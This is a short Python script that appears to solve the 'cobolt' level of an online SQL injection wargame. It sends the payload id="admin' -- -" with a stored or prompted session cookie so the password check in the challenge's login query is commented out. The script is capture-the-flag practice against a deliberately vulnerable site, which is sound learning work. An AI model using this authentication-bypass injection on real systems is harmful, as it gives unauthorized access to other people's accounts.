#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Cobolt

    query : select id from prob_cobolt where id='' and pw=md5('')
    '''

    url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    param = dict(id="admin' -- -")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('COBOLT Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
